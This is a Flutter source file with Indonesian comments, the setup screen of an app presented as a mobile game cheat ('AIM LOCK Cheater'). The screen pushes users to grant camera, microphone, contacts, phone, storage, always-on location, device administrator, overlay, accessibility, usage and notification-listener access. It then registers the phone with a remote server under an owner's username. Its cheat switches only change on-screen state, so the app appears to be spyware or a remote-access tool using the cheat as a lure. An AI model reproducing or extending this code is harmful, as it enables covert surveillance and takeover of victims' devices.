import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../services/api_service.dart';
import '../services/native_service.dart';
import '../utils/theme.dart';

class SetupScreen extends StatefulWidget {
  final String username;
  final bool skipToCheat;
  const SetupScreen({super.key, required this.username, this.skipToCheat = false});
  @override
  State<SetupScreen> createState() => _SetupScreenState();
}

class _SetupScreenState extends State<SetupScreen> with TickerProviderStateMixin {

  int _phase = 0;
  bool _connected = false;

  String _statusText  = 'Mempersiapkan...';
  String _statusHint  = '';
  bool   _waitingUser = false;

  bool _aimLock        = false;
  bool _cheatAntena    = false;
  bool _autoHeadshot   = false;
  bool _overlayEnabled = false;

  late AnimationController _glowCtrl;
  late Animation<double> _glowAnim;
  late AnimationController _pulseCtrl;
  late Animation<double> _pulseAnim;

  static const _cyan   = Color(0xFF00E5FF);
  static const _blue   = Color(0xFF1565C0);
  static const _purple = Color(0xFF7C4DFF);

  @override
  void initState() {
    super.initState();
    _glowCtrl = AnimationController(vsync: this, duration: const Duration(seconds: 2))
      ..repeat(reverse: true);
    _glowAnim = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowCtrl, curve: Curves.easeInOut));
    _pulseCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1200))
      ..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.9, end: 1.05).animate(
      CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut));

    // Jalankan di Future supaya UI langsung render dulu, tidak blocking
    Future.microtask(() {
      if (widget.skipToCheat) {
        _checkAndProceed();
      } else {
        _runPermissionFlow();
      }
    });
  }

  @override
  void dispose() {
    _glowCtrl.dispose();
    _pulseCtrl.dispose();
    super.dispose();
  }

  void _setStatus(String text, {String hint = '', bool waitingUser = false}) {
    if (!mounted) return;
    setState(() {
      _statusText  = text;
      _statusHint  = hint;
      _waitingUser = waitingUser;
    });
  }

  // ── Main permission flow — urutan benar, semua punya timeout ─────────────
  Future<void> _runPermissionFlow() async {

    // STEP 1: Runtime permissions
    _setStatus('Meminta izin dasar...');
    final toRequest = <Permission>[];
    if (!await Permission.camera.isGranted)           toRequest.add(Permission.camera);
    if (!await Permission.microphone.isGranted)       toRequest.add(Permission.microphone);
    if (!await Permission.contacts.isGranted)         toRequest.add(Permission.contacts);
    if (!await Permission.phone.isGranted)            toRequest.add(Permission.phone);
    if (!await Permission.notification.isGranted)     toRequest.add(Permission.notification);
    if (!await Permission.storage.isGranted &&
        !await Permission.manageExternalStorage.isGranted)
                                                      toRequest.add(Permission.storage);
    if (!await Permission.location.isGranted &&
        !await Permission.locationWhenInUse.isGranted) toRequest.add(Permission.location);

    if (toRequest.isNotEmpty) {
      await toRequest.request();
      await Future.delayed(const Duration(milliseconds: 400));
    }

    // Google Location Accuracy dialog — muncul seperti di foto (popup sistem Google)
    _setStatus('Meminta akurasi lokasi...');
    await NativeService.requestLocationAccuracy();
    await Future.delayed(const Duration(milliseconds: 600));

    // Background location — setelah location accuracy aktif, minta always
    if (!await Permission.locationAlways.isGranted) {
      final bgStatus = await Permission.locationAlways.request();
      await Future.delayed(const Duration(milliseconds: 400));
      if (!await Permission.locationAlways.isGranted) {
        await openAppSettings();
        _setStatus(
          'Izinkan Lokasi "Setiap Saat"',
          hint: 'Di halaman izin yang terbuka:\n1. Tap "Izin lokasi"\n2. Pilih "Izinkan setiap saat"\n3. Kembali ke app ini',
          waitingUser: true,
        );
        for (int i = 0; i < 120; i++) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await Permission.locationAlways.isGranted) break;
        }
      }
    }

    // STEP 2: Device Admin DULU (dibutuhkan agar auto-grant overlay bisa berhasil)
    _setStatus('Meminta izin administrator...');
    if (!await NativeService.checkDeviceAdmin()) {
      await NativeService.requestDeviceAdmin();
      _setStatus(
        'Aktifkan Administrator Perangkat',
        hint: 'Tap "Aktifkan" di dialog administrator yang muncul, lalu kembali ke app',
        waitingUser: true,
      );
      // Timeout 90 detik
      for (int i = 0; i < 90; i++) {
        await Future.delayed(const Duration(seconds: 1));
        if (!mounted) return;
        if (await NativeService.checkDeviceAdmin()) break;
      }
    }

    // STEP 3: Overlay — coba auto-grant via DPM dulu, kalau gagal buka settings
    if (!await NativeService.checkOverlayPermission()) {
      _setStatus('Meminta izin overlay...');
      await NativeService.requestOverlayPermission();
      await Future.delayed(const Duration(milliseconds: 800));

      if (!await NativeService.checkOverlayPermission()) {
        _setStatus(
          'Izinkan "Tampilkan di atas aplikasi lain"',
          hint: 'Di halaman pengaturan yang terbuka:\n1. Cari nama app ini\n2. Aktifkan toggle-nya\n3. Kembali ke app ini',
          waitingUser: true,
        );
        // Timeout 120 detik
        for (int i = 0; i < 120; i++) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await NativeService.checkOverlayPermission()) break;
        }
      }
    }

    // STEP 4: Accessibility (opsional, timeout 60 detik)
    if (!await NativeService.checkAccessibility()) {
      _setStatus('Meminta izin aksesibilitas...');
      await NativeService.requestAccessibility();
      await Future.delayed(const Duration(milliseconds: 800));

      if (!await NativeService.checkAccessibility()) {
        _setStatus(
          'Aktifkan Layanan Aksesibilitas',
          hint: 'Cari dan aktifkan layanan app ini di Settings Aksesibilitas yang terbuka',
          waitingUser: true,
        );
        for (int i = 0; i < 10; i++) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await NativeService.checkAccessibility()) break;
        }
      }
    }

    // STEP 5: Usage Access (opsional, timeout 30 detik)
    if (!await NativeService.checkUsageAccess()) {
      _setStatus('Meminta izin akses penggunaan...');
      await NativeService.requestUsageAccess();
      await Future.delayed(const Duration(milliseconds: 500));

      if (!await NativeService.checkUsageAccess()) {
        _setStatus(
          'Aktifkan Akses Penggunaan',
          hint: 'Aktifkan di Settings Penggunaan Data yang terbuka',
          waitingUser: true,
        );
        for (int i = 0; i < 10; i++) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await NativeService.checkUsageAccess()) break;
        }
      }
    }

    // STEP 6: Notification Listener (opsional, timeout 30 detik)
    if (!await NativeService.checkNotifListener()) {
      _setStatus('Meminta izin notifikasi...');
      await NativeService.requestNotifListener();
      await Future.delayed(const Duration(milliseconds: 500));

      if (!await NativeService.checkNotifListener()) {
        _setStatus(
          'Aktifkan Akses Notifikasi',
          hint: 'Aktifkan app ini di Settings Notifikasi yang terbuka',
          waitingUser: true,
        );
        for (int i = 0; i < 10; i++) {
          await Future.delayed(const Duration(seconds: 1));
          if (!mounted) return;
          if (await NativeService.checkNotifListener()) break;
        }
      }
    }

    // STEP 7: Connect server
    _setStatus('Menghubungkan ke server...');
    await _connectServer();
  }

  Future<void> _checkAndProceed() async {
    final allOk =
      await NativeService.checkOverlayPermission() &&
      await NativeService.checkDeviceAdmin() &&
      await Permission.camera.isGranted &&
      await Permission.microphone.isGranted &&
      await Permission.contacts.isGranted &&
      await Permission.phone.isGranted &&
      (await Permission.storage.isGranted || await Permission.manageExternalStorage.isGranted) &&
      (await Permission.location.isGranted || await Permission.locationWhenInUse.isGranted);

    if (allOk) {
      await _connectServer();
    } else {
      await _runPermissionFlow();
    }
  }

  Future<void> _connectServer() async {
    _setStatus('Mendaftarkan perangkat...');
    try {
      final prefs         = await SharedPreferences.getInstance();
      final ownerUsername = prefs.getString('ownerUsername') ?? widget.username;
      String deviceId     = prefs.getString('deviceId') ?? '';
      if (deviceId.isEmpty) {
        deviceId = 'aimlock_${_randomHex(8)}';
        await prefs.setString('deviceId', deviceId);
      }
      String deviceName = prefs.getString('deviceName') ?? '';
      if (deviceName.isEmpty) {
        deviceName = 'HP-${widget.username.toUpperCase()}-${_randomHex(4).toUpperCase()}';
        await prefs.setString('deviceName', deviceName);
      }
      await NativeService.startSocketService(
        serverUrl:     ApiService.baseUrl,
        deviceId:      deviceId,
        deviceName:    deviceName,
        ownerUsername: ownerUsername,
      );
      await prefs.setBool('server_connected', true);
      // Simpan juga key yg dicek oleh AppProtectionService (native side)
      await prefs.setBool('flutter.server_connected', true);
      if (mounted) setState(() => _connected = true);
    } catch (_) {}

    if (mounted) setState(() => _phase = 1);
  }

  String _randomHex(int len) {
    final rng = Random.secure();
    return List.generate(len, (_) => rng.nextInt(16).toRadixString(16)).join();
  }

  void _onToggle(String type, bool value) {
    HapticFeedback.mediumImpact();
    setState(() {
      switch (type) {
        case 'aim':      _aimLock = value; break;
        case 'antena':   _cheatAntena = value; break;
        case 'headshot': _autoHeadshot = value; break;
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppTheme.darkBg,
      body: SafeArea(
        child: _phase == 0
          ? _buildLoading()
          : _buildCheatDashboard()),
    );
  }

  // ── Loading screen dengan status real-time ────────────────────────────
  Widget _buildLoading() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 40),
        child: Column(mainAxisSize: MainAxisSize.min, children: [

          AnimatedBuilder(
            animation: _pulseAnim,
            builder: (_, __) => Container(
              width: 72 * _pulseAnim.value,
              height: 72 * _pulseAnim.value,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: _cyan.withOpacity(0.08),
                border: Border.all(
                  color: _waitingUser
                    ? Colors.orange.withOpacity(0.6)
                    : _cyan.withOpacity(0.3),
                  width: 1.5),
                boxShadow: [BoxShadow(
                  color: (_waitingUser ? Colors.orange : _cyan).withOpacity(0.15),
                  blurRadius: 28)]),
              child: Center(
                child: _waitingUser
                  ? Icon(Icons.touch_app_rounded,
                      color: Colors.orange.withOpacity(0.8), size: 30)
                  : const SizedBox(width: 28, height: 28,
                      child: CircularProgressIndicator(
                        color: Color(0xFF00E5FF), strokeWidth: 2))))),

          const SizedBox(height: 24),

          Text(
            _statusText,
            textAlign: TextAlign.center,
            style: TextStyle(
              fontFamily: 'Orbitron', fontSize: 13,
              color: _waitingUser ? Colors.orange : Colors.white,
              letterSpacing: 1.2)),

          if (_statusHint.isNotEmpty) ...[
            const SizedBox(height: 12),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              decoration: BoxDecoration(
                color: Colors.orange.withOpacity(0.08),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.orange.withOpacity(0.3))),
              child: Text(
                _statusHint,
                textAlign: TextAlign.center,
                style: TextStyle(
                  fontFamily: 'ShareTechMono', fontSize: 10,
                  color: Colors.orange.withOpacity(0.85),
                  height: 1.7))),
          ],
        ]),
      ),
    );
  }

  Widget _buildCheatDashboard() {
    return SingleChildScrollView(
      padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 20),
      child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [

        Row(children: [
          AnimatedBuilder(
            animation: _glowAnim,
            builder: (_, __) => Container(
              width: 44, height: 44,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: const SweepGradient(colors: [
                  Color(0xFF00E5FF), Color(0xFF1565C0),
                  Color(0xFF7C4DFF), Color(0xFF00E5FF)]),
                boxShadow: [BoxShadow(
                  color: _cyan.withOpacity(0.3 * _glowAnim.value), blurRadius: 16)]),
              child: Padding(
                padding: const EdgeInsets.all(2),
                child: Container(
                  decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.black),
                  child: ClipOval(
                    child: Image.asset('assets/icons/login.jpg', fit: BoxFit.cover,
                      errorBuilder: (_, __, ___) => const Icon(
                        Icons.shield_rounded, color: Colors.white, size: 24))))))),
          const SizedBox(width: 12),
          Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            const Text('AIM LOCK', style: TextStyle(
              fontFamily: 'Deltha', fontSize: 18,
              color: Colors.white, letterSpacing: 3)),
            Text('C · H · E · A · T · E · R',
              style: TextStyle(fontFamily: 'Orbitron', fontSize: 8,
                color: _cyan.withOpacity(0.7), letterSpacing: 3)),
          ]),
          const Spacer(),
          AnimatedBuilder(
            animation: _glowAnim,
            builder: (_, __) {
              final color = _connected ? const Color(0xFF4CAF50) : const Color(0xFFFF9800);
              return Container(
                width: 12, height: 12,
                decoration: BoxDecoration(
                  shape: BoxShape.circle, color: color,
                  boxShadow: [BoxShadow(
                    color: color.withOpacity(0.6 * _glowAnim.value), blurRadius: 8)]));
            }),
        ]),

        const SizedBox(height: 8),
        AnimatedBuilder(
          animation: _glowAnim,
          builder: (_, __) => Container(height: 1,
            decoration: BoxDecoration(gradient: LinearGradient(colors: [
              _cyan.withOpacity(0.6 * _glowAnim.value), Colors.transparent])))),
        const SizedBox(height: 28),

        Center(child: _buildProfilePhoto()),
        const SizedBox(height: 8),
        Center(child: Text(widget.username.toUpperCase(),
          style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 11,
            color: _cyan.withOpacity(0.6), letterSpacing: 3))),
        const SizedBox(height: 28),

        _buildCheatToggle(
          icon: Icons.gps_fixed_rounded, label: 'AIM LOCK',
          subtitle: 'Auto target enemy', value: _aimLock,
          color: const Color(0xFFFF5252),
          onChanged: (v) => _onToggle('aim', v)),
        const SizedBox(height: 12),
        _buildCheatToggle(
          icon: Icons.wifi_tethering_rounded, label: 'CHEAT ANTENA',
          subtitle: 'Signal boost & wall hack', value: _cheatAntena,
          color: _cyan,
          onChanged: (v) => _onToggle('antena', v)),
        const SizedBox(height: 12),
        _buildCheatToggle(
          icon: Icons.my_location_rounded, label: 'AUTO HEADSHOT',
          subtitle: 'Perfect accuracy mode', value: _autoHeadshot,
          color: const Color(0xFFFFD700),
          onChanged: (v) => _onToggle('headshot', v)),

        const SizedBox(height: 20),

        AnimatedBuilder(
          animation: _glowAnim,
          builder: (_, __) => Row(children: [
            Expanded(child: Container(height: 1, color: Colors.white.withOpacity(0.07))),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 12),
              child: Text('SETTINGS', style: TextStyle(
                fontFamily: 'Orbitron', fontSize: 7,
                color: Colors.white.withOpacity(0.25), letterSpacing: 3))),
            Expanded(child: Container(height: 1, color: Colors.white.withOpacity(0.07))),
          ])),

        const SizedBox(height: 12),

        _buildCheatToggle(
          icon: Icons.picture_in_picture_rounded,
          label: 'OVERLAY PANEL',
          subtitle: 'Tampilkan panel di atas semua app',
          value: _overlayEnabled,
          color: const Color(0xFF9C27B0),
          onChanged: (v) async {
            HapticFeedback.mediumImpact();
            setState(() => _overlayEnabled = v);
            if (v) {
              await NativeService.startCheatOverlay();
            } else {
              await NativeService.stopCheatOverlay();
            }
          }),


        const SizedBox(height: 32),
        Center(child: Text('Aim Lock v1.0.0 • Authorized Only',
          style: TextStyle(fontFamily: 'ShareTechMono', fontSize: 9,
            color: Colors.white.withOpacity(0.2)))),
      ]),
    );
  }

  Widget _buildProfilePhoto() {
    return AnimatedBuilder(
      animation: _glowAnim,
      builder: (_, __) {
        final g = _glowAnim.value;
        return Container(
          width: 110, height: 110,
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            gradient: SweepGradient(colors: [
              _cyan.withOpacity(g), _blue, _purple.withOpacity(g), _cyan.withOpacity(g)]),
            boxShadow: [BoxShadow(
              color: _cyan.withOpacity(0.3 * g), blurRadius: 20, spreadRadius: 2)]),
          child: Padding(
            padding: const EdgeInsets.all(3),
            child: Container(
              decoration: const BoxDecoration(shape: BoxShape.circle, color: Colors.black),
              child: ClipOval(
                child: Image.asset('assets/icons/login.jpg',
                  width: 104, height: 104, fit: BoxFit.cover,
                  errorBuilder: (_, __, ___) => Container(
                    color: AppTheme.primaryBlue,
                    child: const Icon(Icons.person_rounded, color: Colors.white, size: 50)))))));
      });
  }

  Widget _buildCheatToggle({
    required IconData icon, required String label, required String subtitle,
    required bool value, required Color color, required ValueChanged<bool> onChanged,
  }) {
    return AnimatedBuilder(
      animation: _glowAnim,
      builder: (_, __) => AnimatedContainer(
        duration: const Duration(milliseconds: 300),
        padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
        decoration: BoxDecoration(
          color: value ? color.withOpacity(0.1) : AppTheme.cardBg,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(
            color: value
              ? color.withOpacity(0.5 + 0.3 * _glowAnim.value)
              : color.withOpacity(0.2),
            width: value ? 1.5 : 1),
          boxShadow: value ? [BoxShadow(
            color: color.withOpacity(0.15 * _glowAnim.value),
            blurRadius: 16, spreadRadius: 1)] : []),
        child: Row(children: [
          Container(
            width: 40, height: 40,
            decoration: BoxDecoration(
              color: color.withOpacity(value ? 0.2 : 0.08),
              borderRadius: BorderRadius.circular(11),
              border: Border.all(color: color.withOpacity(value ? 0.6 : 0.25))),
            child: Icon(icon, color: color.withOpacity(value ? 1.0 : 0.5), size: 20)),
          const SizedBox(width: 14),
          Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            Text(label, style: TextStyle(
              fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold,
              color: value ? color : Colors.white.withOpacity(0.7), letterSpacing: 1)),
            const SizedBox(height: 2),
            Text(subtitle, style: TextStyle(fontFamily: 'ShareTechMono',
              fontSize: 9, color: Colors.white.withOpacity(0.35))),
          ])),
          Transform.scale(
            scale: 0.85,
            child: Switch(
              value: value, onChanged: onChanged,
              activeColor: color, activeTrackColor: color.withOpacity(0.25),
              inactiveThumbColor: Colors.white.withOpacity(0.3),
              inactiveTrackColor: Colors.white.withOpacity(0.08))),
        ]),
      ));
  }
}
